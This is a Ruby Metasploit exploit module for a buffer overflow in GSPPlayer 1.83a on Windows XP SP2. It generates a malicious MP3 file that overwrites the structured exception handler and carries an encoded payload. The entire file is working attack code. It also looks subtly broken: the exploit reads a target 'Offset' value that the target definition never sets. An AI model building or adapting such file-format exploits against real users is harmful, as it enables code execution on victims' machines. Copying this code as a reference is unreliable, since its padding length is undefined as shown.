require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking

    include Msf::Exploit::FILEFORMAT

    def initialize(info = {})
        super(update_info(info,
            'Name'          =>      "GSPPlayer 1.83a",
            'Description'   =>      %q{
                 This exploits a buffer overflow in GSPPlayer 1.83a
            },
            'License'       =>      MSF_LICENSE,
            'Author'        =>      [
                'Constantin Musca'
            ],
            'Version'       =>      '$Revision: $',
            'References'    =>  [
                ['URL',     "http://www.exploit-db.com/exploits/14681/"],
            ],
            'Payload'       =>  {
                'Space'     => 6000,
                'BadChars'  =>  "\x00\x0a",
                'StackAdjustment' => -3500,
            },
            'Platform'      => 'win',
            'Targets'       =>  [
                ['Windows XP SP2', { 'Ret' => 0x735275CB } ],
            ],
            'Privileged'    =>  false,
            'DisclosureDate'    =>  'Jun 16 2012',
            'DefaultTarget'     =>  0)
        )

        register_options(
            [
                OptString.new('FILENAME', [false, "The filename", "msf.mp3"]),
            ], self.class
        )
    end

    def exploit
        sploit = rand_text_alpha_upper(target['Offset'])
        sploit << generate_seh_payload(target.ret)
        sploit << make_nops(12)
        sploit << payload.encoded

        print_status("Creating '#{datastore['FILENAME']}' file ...")

        file_create(sploit)
    end


end
